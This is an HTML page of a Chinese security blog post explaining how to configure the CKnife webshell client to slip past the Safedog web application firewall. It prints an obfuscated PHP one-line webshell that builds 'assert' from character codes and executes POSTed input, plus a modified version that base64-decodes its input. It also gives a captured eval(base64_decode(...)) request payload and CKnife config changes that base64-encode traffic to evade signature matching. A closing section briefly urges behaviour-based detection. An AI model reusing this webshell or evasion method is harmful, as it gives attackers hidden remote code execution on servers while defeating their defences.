<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta content="倾旋的博客" property="og:site_name">

  <meta content="Cknife Bypass WAF" property="og:title">


  <meta content="article" property="og:type">


  <meta content="本文简述一下配置CKnife达到bypass软WAF的实例" property="og:description">


  <meta content="http://localhost:4000/archivers/2017-06-05/1" property="og:url">


  <meta content="2017-06-05T00:00:00+08:00" property="article:published_time">
  <meta content="http://localhost:4000/about/" property="article:author">


  <meta property="og:image" content="">


  
  <meta content="bypass" property="article:section">
  


  

  <title>Cknife Bypass WAF</title>
  <meta name="description" content="本文简述一下配置CKnife达到bypass软WAF的实例0x00 前言这篇文章之前写过，由于博客关闭，重写一遍。由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本博主不为此承担任何责任。  主要思路就是讲工具传输的内容加密，绕过WAF的匹配。所需要的环境：  Window...">
<script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min.js"></script>
<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
  
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/ptsans.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firamono.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lato.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/sourcecodepro.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/gentiumbasic.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/alegreya.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/lora.css' rel='stylesheet' type='text/css'>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/firasans400.css' rel='stylesheet' type='text/css'>
  <script src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/jquery.min2.2.0.js"></script>
  <link href='http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/static/opensans.css' rel='stylesheet' type='text/css'>
<link rel="stylesheet" href="https://cdn.bootcss.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
  <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-hQpvDQiCJaD2H465dQfA717v7lu5qHWtDbWNPvaTJ0ID5xnPUlVXnKzq7b8YUkbN" crossorigin="anonymous">
  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://localhost:4000/archivers/2017-06-05/1">
  <link rel="alternate" type="application/rss+xml" title="倾旋的博客" href="http://localhost:4000/feed.xml">
</head>


  <body>

<section>
<nav class="navbar navbar-default navbar-fixed-top">

  <div class="container">
    <!-- Brand and toggle get grouped for better mobile display -->
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
        <span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
      <a class="navbar-brand" href="/">倾旋的博客</a>
    </div>


    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
      <ul class="nav navbar-nav">
        
        
        <li><a href="/about/">关于我</a></li>

        

        
        
        <li><a href="/category/">文章分类</a></li>

        

        
        

        
        

        
        

        
        
        <li><a href="/other/">其他信息</a></li>

        

        


      </ul>

    <!--  <ul class="nav navbar-nav navbar-right">
        <li><a href="#">Know More!</a></li>

      </ul>-->
    </div><!-- /.navbar-collapse -->
  </div><!-- /.container-fluid -->
</nav>
</section>

<section>
<article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <div class="jumbotron">
    <div class="container">
      <h1 class="post-title-main" itemprop="name headline">Cknife Bypass WAF</h1>
      <p class="post-meta"><time datetime="2017-06-05T00:00:00+08:00" itemprop="datePublished">Jun 5, 2017</time> • <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span itemprop="name">倾旋</span></span>
      
      <div class="bdsharebuttonbox" style="background-color: white;width: 27%;border-radius: 10px;padding-left: 10px; "><a href="#" class="bds_more" data-cmd="more"></a><a href="#" class="bds_twi" data-cmd="twi" title="分享到Twitter"></a><a href="#" class="bds_fbook" data-cmd="fbook" title="分享到Facebook"></a><a href="#" class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#" class="bds_weixin" data-cmd="weixin" title="分享到微信"></a><a href="#" class="bds_evernotecn" data-cmd="evernotecn" title="分享到印象笔记"></a><a href="#" class="bds_youdao" data-cmd="youdao" title="分享到有道云笔记"></a><a href="#" class="bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a><a href="#" class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#" class="bds_tieba" data-cmd="tieba" title="分享到百度贴吧"></a><a href="#" class="bds_copy" data-cmd="copy" title="分享到复制网址"></a><a href="#" class="bds_print" data-cmd="print" title="分享到打印"></a></div>
<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":["mshare","qzone","tsina","bdysc","weixin","sqq","youdao","mail","fbook","twi","linkedin","h163","evernotecn","copy","print"],"bdPic":"","bdStyle":"1","bdSize":"16"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
      </p>
      
    </div>

</div>


  <div class="post-content container" itemprop="articleBody">
    <p>本文简述一下配置CKnife达到bypass软WAF的实例
<!--more--></p>
<h2 id="0x00-前言">0x00 前言</h2>

<p>这篇文章之前写过，由于博客关闭，重写一遍。</p>

<p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本博主不为此承担任何责任。</p>

<blockquote>
  <p>主要思路就是讲工具传输的内容加密，绕过WAF的匹配。</p>
</blockquote>

<p>所需要的环境：</p>

<ul>
  <li>Windows Server 2003</li>
  <li>Safe dog 4.0 正式版</li>
  <li>CKnife 1.0 Release</li>
  <li>BurpSuite 1.6</li>
  <li>ByPass 一句话木马一枚</li>
</ul>

<p>Bypass Shell 具体可以点击这里寻找：<a href="https://code.csdn.net/payloads/webshell/tree/master/PHP/20170526_bypass">Bypass Shell</a></p>

<p><code class="highlighter-rouge">Shell Code</code> 如下：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$___Ss</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="mi">97</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>  <span class="c1">//[a]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">101</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[e]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">114</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[r]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">116</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[t]</span>
<span class="nv">$___Ss</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]);</span>
</code></pre></div></div>

<h2 id="0x01-普通传输模式分析">0x01 普通传输模式分析</h2>

<p>首先我们在WAF开启的情况下直接连接：</p>

<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x00.png" alt="添加Shell" /></p>

<p>接着为了方便分析，我们为当前条目添加上一个代理，通过<code class="highlighter-rouge">Burp</code>来分析与服务器端木马的交互数据。</p>

<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x01.png" alt="添加代理" /></p>

<p>双击进行连接后，数据包到了我们的Burp中：</p>

<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x02.png" alt="分析数据" /></p>

<p>可以看到已经被<code class="highlighter-rouge">WAF</code>拦截了：</p>

<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x03.png" alt="拦截截图" /></p>

<p>那么我们深知，手工的话是不会被拦截的，为什么呢？</p>

<p>手工截图：</p>

<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x05.png" alt="手工" /></p>

<h2 id="0x02-站在waf的角度考虑">0x02 站在WAF的角度考虑</h2>

<p>先来看看数据包：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /3.php HTTP/1.1
User-Agent: Java/1.8.0_131
Host: 192.168.1.103
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Proxy-Connection: keep-alive
Content-type: application/x-www-form-urlencoded
Content-Length: 680

username=@eval(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7aWYoJEQ9PSIiKSREPWRpcm5hbWUoJF9TRVJWRVJbIlBBVEhfVFJBTlNMQVRFRCJdKTskUj0ieyREfVx0IjtpZihzdWJzdHIoJEQsMCwxKSE9Ii8iKXtmb3JlYWNoKHJhbmdlKCJBIiwiWiIpIGFzICRMKWlmKGlzX2RpcigieyRMfToiKSkkUi49InskTH06Ijt9JFIuPSJcdCI7JHU9KGZ1bmN0aW9uX2V4aXN0cygncG9zaXhfZ2V0ZWdpZCcpKT9AcG9zaXhfZ2V0cHd1aWQoQHBvc2l4X2dldGV1aWQoKSk6Jyc7JHVzcj0oJHUpPyR1WyduYW1lJ106QGdldF9jdXJyZW50X3VzZXIoKTskUi49cGhwX3VuYW1lKCk7JFIuPSIoeyR1c3J9KSI7cHJpbnQgJFI7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D
</code></pre></div></div>

<p>分析出以下几点可疑行为：</p>
<ul>
  <li>首先普通用户的UserAgent肯定是常见的终端标识，那么数据包中的<code class="highlighter-rouge">User-Agent</code>就可能成为WAF的拦截对象</li>
  <li>username参数的值非常可疑，因为有<code class="highlighter-rouge">eval</code>、<code class="highlighter-rouge">base64_decode</code>、<code class="highlighter-rouge">$_POST</code>等标识。</li>
</ul>

<p>随之我们根据<code class="highlighter-rouge">Shell Code</code>与<code class="highlighter-rouge">数据包</code>来分析代码的执行流程：</p>

<p>当我们的<code class="highlighter-rouge">username=@eval(base64_decode($_POST[action]));</code>传给服务器后，又开辟了一个参数再传递给<code class="highlighter-rouge">eval</code>，在我们看来都是多此一举的，我们只要直接把数据传递给<code class="highlighter-rouge">username</code>即可。</p>

<p>我在此没有发现能够更改这种传输方式，没有去看源码。</p>

<p>最终我通过了另一种方式去更改传递数据。</p>

<h2 id="0x03-just-do-it">0x03 Just Do it</h2>

<p>先看看Cknife的配置文件<code class="highlighter-rouge">Config.ini</code>说明：</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PARAM1=z1         			       参数1 
PARAM2=z2         			       参数2 
PHP_BASE64=1   				       当为PHP时，Z1，Z2参数是否开启自动base64加密，如果想定义自己的加密方式则关闭设置为0 
PHP_MAKE=@eval(base64_decode($_POST[action])); 生成方式，这里可以不用该方式，可以用你任何想要的方式 
</code></pre></div></div>
<p>最关键的就是<code class="highlighter-rouge">PHP_MAKE</code>参数了，我们将其改成base64编码后的结果。</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PHP_BASE64=1
PHP_MAKE=ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFthY3Rpb25dKSk\=
</code></pre></div></div>
<p>这里多了一个<code class="highlighter-rouge">\</code>，是jar程序自己转码的。读者可以将此<code class="highlighter-rouge">code</code>去<code class="highlighter-rouge">base64_decode</code>一下，看看是不是 <code class="highlighter-rouge">@eval(base64_decode($_POST[action]));</code></p>

<p>那么此时是否真的能够Bypass呢？</p>

<p>NO NO NO，因为我们的Shell Code并没有解码功能。</p>

<p>更改后如下：</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$___Ss</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="mi">97</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>  <span class="c1">//[a]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">101</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[e]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">114</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[r]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">116</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[t]</span>
<span class="nv">$___Ss</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">]));</span>
</code></pre></div></div>

<p>传递过去后在服务器端其实运行的代码可以这么理解为：</p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="nv">$___Ss</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">((</span><span class="mi">97</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>  <span class="c1">//[a]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">115</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[s]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">101</span> <span class="o">^</span> <span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span> <span class="c1">//[e]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">114</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[r]</span>
<span class="nv">$___Ss</span> <span class="o">.=</span><span class="nb">chr</span><span class="p">((</span><span class="mi">116</span> <span class="o">^</span> <span class="mi">0</span><span class="p">));</span> <span class="c1">//[t]</span>
<span class="nv">$___Ss</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="s1">'ZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFthY3Rpb25dKSk='</span><span class="p">);</span>
</code></pre></div></div>

<p>解码后是：<code class="highlighter-rouge">$___Ss(@eval(base64_decode($_POST[action])))</code></p>

<p>再次简化为：<code class="highlighter-rouge">assert(@eval(base64_decode($_POST[action])))</code></p>

<p>那么现在你就应该可以明白了，我们的Cknife传出的全部都是Base64编码，从而绕过WAF对数据包敏感词汇的匹配。</p>

<blockquote>
  <p>个人认为Base64目前是最为方便的传输方式，因为该传输行为与开发人员极其相似，例如：图片base64传输，还有我们<code class="highlighter-rouge">Shell Code</code>中使用的参数，也是开发人员经常用到的 <code class="highlighter-rouge">username</code></p>
</blockquote>

<p>此时更改好后我们去try一下 ～</p>

<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x06.png" alt="Success" /></p>

<p>看来已经成功了。</p>

<p>查看进程：</p>

<p><img src="http://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2017-06-05/0x07.png" alt="Command" /></p>

<p>图中选中的进程<code class="highlighter-rouge">SafeDogSiteApache.exe</code>，就是WAF了，一切都没有拦截。</p>

<h2 id="0x04-最后的思考">0x04 最后的思考</h2>

<p>如果想做到真正的安全，还是要深入行为查杀，当前的WAF不是很强大，基本上通过匹配数据包的内容已经无法满足防护的需求了。</p>

<p>因为当前的传输方式是通过正常的手法去传输的。</p>

<p>下一次升级可以考虑进行各种可能的解码…… 不过只是亡羊补牢的做法罢了。</p>

<p>最终还是要加强木马的查杀，相关文章<a href="https://zhuanlan.zhihu.com/p/27148719">脚本木马查杀原理的简单探讨</a></p>

<p>由于文章比较敏感，就不在知乎发布了。 感谢阅读，微信公众号：<code class="highlighter-rouge">知安小酒馆</code> 欢迎关注 ！</p>

<p>我的微信：Guest_Killer_0nlis</p>



<div class="pull-right">
  <script type="text/javascript">
    function smoothscroll(){
    var currentScroll = document.documentElement.scrollTop || document.body.scrollTop;
    if (currentScroll > 0) {
         window.requestAnimationFrame(smoothscroll);
         window.scrollTo (0,currentScroll - (currentScroll/5));
    }
};
  </script>
<button class="btn btn-primary" onclick="smoothscroll()">回到顶部</button>
</div>
<br>


    <h3>本文许可协议</h3>

    <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">
    	<img alt="知识共享许可协议" style="border-width:0;height: 30px;width: 80px;" src="https://i.creativecommons.org/l/by/4.0/88x31.png" /></a><br />本作品采用<a rel="license" href="http://creativecommons.org/licenses/by/4.0/">知识共享署名 4.0 国际许可协议</a>进行许可。
  </div>

</article>

</section>
<!-- 
<nav class="navbar navbar-default navbar-fixed-bottom">
  <div class="container footer-content">
    Jekyll Theme by Hemang Kumar/Powered By Jekyll/Site owner is 倾旋
  </div>
</nav>
-->
<script src="https://s22.cnzz.com/z_stat.php?id=1262492389&web_id=1262492389" language="JavaScript"></script>
  </body>

</html>
